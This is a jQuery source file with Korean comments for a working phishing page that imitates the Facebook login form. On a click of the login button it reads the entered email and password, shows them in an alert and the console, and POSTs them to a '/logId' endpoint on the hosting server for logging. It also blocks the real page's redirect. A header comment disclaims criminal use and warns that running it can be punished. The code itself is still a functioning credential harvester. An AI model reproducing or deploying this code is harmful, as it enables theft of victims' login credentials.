/**
 * @description	
 * 		상업용 범죄용으로 만든 프로젝트가 아님.
 * 			처벌받을 수 있으니 소스 코드 분석 용도로만 사용하기 
 * 			만들어서 서버 띄우는 것 만으로도 처벌 받을 수 있으니 유의!!
 * 			지인들 낚는다고 장난으로라도 시도 절대. 절대. 절대. 금지!!
 */

	/**
	 * @description
	 * 		페이지 호출시 비밀번호 칸에 style 잡히는 현상 방지
	 */
	$(document).ready(function() {
		$("#passContainer").removeClass("_9nyi")
	})
	
	/**
	 * @description
	 * 		로그인 버튼 클릭시 
	 * 			팝업창 출력 
	 * 			콘솔 로그 처리 
	 * 			controller 전달 함수 호출
	 */
	$("#btn_login").on("click", function(e) {
		//아이디 비밀번호 공백 예외 처리
		if ($("#email").val() == "" || $("#pass").val() == "") {
			alert("아이디, 비밀번호를 확인해주세요.");
			return;
		}
	
		//알림 팝업창 띄우기 > 필요에 따라서 주석 처리 
		alert("id : " + $("#email").val() + "\n" + "pw: " + $("#pass").val());
	
		//개발자 도구 (F12) 콘솔창에 출력
		console.log("아이디 : " + $("#email").val() + "\n" + "비밀번호 : " + $("#pass").val());
	
		//페이지 이동 (현재 redirect url 은 페이스 북 한국 홈페이지로 설정)
		//location.replace("https://www.facebook.com/?locale=ko_KR");
	
		// id pw controller 로 전달 -> logging 처리
		sendCntr();
		//기존 cdn 으로 호출된 js redirect 막기 
		e.preventDefault();
	
	})
	
	/**
	 * @description
	 * 		id , pw 값 controller 로 전달 - 로그 처리 
	 * 			(Controller send)
	 */
	const sendCntr = _ => {
		$.ajax({
			url: getContextPath() + "/logId"
			, type: "POST"
			, data: { "strId": $("#email").val(), "strPw": $("#pass").val() }
		})
	}
	
	/**
	 * @description
	 * 		path return (현재 경로 리턴)
	 */
	const getContextPath = _ => {
		let path = window.location.href;
		return path;
	}
	
	/**
	 * @description
	 * 		아이디 입력칸에서 tab키 누를시 비밀번호 input box style 틀어지는 현상 예방
	 */
	$("#email").on({
		"keydown": function(e) {
			// 9: tab , 13: enter
			if (e.keyCode === 9 || e.keyCode === 13) {
				e.preventDefault();
			}
		}
	})
